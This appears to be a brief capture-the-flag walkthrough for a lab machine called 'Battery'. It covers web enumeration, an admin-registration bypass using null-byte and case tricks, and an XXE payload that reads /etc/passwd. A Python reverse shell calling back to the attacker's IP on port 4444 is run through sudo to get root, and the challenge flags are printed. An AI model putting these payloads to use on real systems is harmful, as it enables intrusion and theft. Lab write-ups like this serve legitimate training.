# Battery 

> VOiD | Thursday 20 January 2022 03:02:19 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.44.181


## PORT 80 [http]
```bash

we have a php webserver

test creds
as:as

/report gives a binary

===============List of active users================
support@bank.a
contact@bank.a
cyber@bank.a
admins@bank.a
sam@bank.a
admin0@bank.a
super_user@bank.a
control_admin@bank.a
it_admin@bank.a

trying to register with admin email gives error

admin@bank.A
Admin@bank.a
admin@bank.a%20
admin@bank.a%00

bypass

http://10.10.20.24/dashboard.php

http://10.10.20.24/forms.php
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>



<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<root><name>1</name><search>&xxe;</search></root>


yash:x:1002:1002:,,,:/home/yash:/bin/bash

/home/yash/.ssh/id_rsa

```

## USER [cyber]
```bash
cyber@ubuntu:~$ cat flag1.txt 
THM{6f7e4dd134e19af144c88e4fe46c67ea}

Sorry I am not good in designing ascii art :(


User cyber may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.253.221",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])

sudo /usr/bin/python3 /home/cyber/run.py

```

## USER [Root]
```bash
root@ubuntu:/home/yash# cat flag2.txt 
THM{20c1d18791a246001f5df7867d4e6bf5}


Sorry no ASCII art again :(
root@ubuntu:/home/yash# cat flag2.txt 
THM{20c1d18791a246001f5df7867d4e6bf5}


Sorry no ASCII art again :(


root@ubuntu:/home/yash# cat fernet 
encrypted_text:gAAAAABfs33Qms9CotZIEBMg76eOlwOiKU8LD_mX2F346WXXBVIlXWvWGfreAX4kU5hjGXf0PiwtP0cmOm5JSUI7zl03V1JKlA==

key:7OEIooZqOpT7vOh9ax8arbBeB8e243Pr8K4IVWBStgA=


cat /root.txt
THM{db12b4451d5e70e2a177880ecfe3428d}

```